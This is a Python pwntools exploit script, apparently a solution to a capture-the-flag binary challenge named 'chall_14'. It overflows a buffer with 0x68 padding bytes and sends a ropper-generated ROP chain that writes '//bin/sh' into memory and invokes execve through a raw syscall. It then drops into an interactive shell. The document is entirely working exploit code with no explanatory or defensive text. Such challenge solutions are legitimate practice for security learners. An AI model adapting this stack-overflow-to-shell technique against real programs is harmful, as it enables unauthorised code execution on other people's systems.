from pwn import *

binary = context.binary = ELF('./chall_14')
context.log_level = 'INFO'

p = process('./chall_14')

#ropper --file chall_14 --chain "execve cmd=/bin/sh" --badbytes 0a
IMAGE_BASE_0 = binary.address
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)
rop  = b''
rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret;
rop += b'//bin/sh'
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000010263) # 0x0000000000410263: pop rsi; ret;
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x000000000004c086) # 0x000000000044c086: pop rdx; ret;
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret;

payload  = 0x68 * b'A'
payload += rop

p.sendline()
p.sendline(payload)
p.interactive()
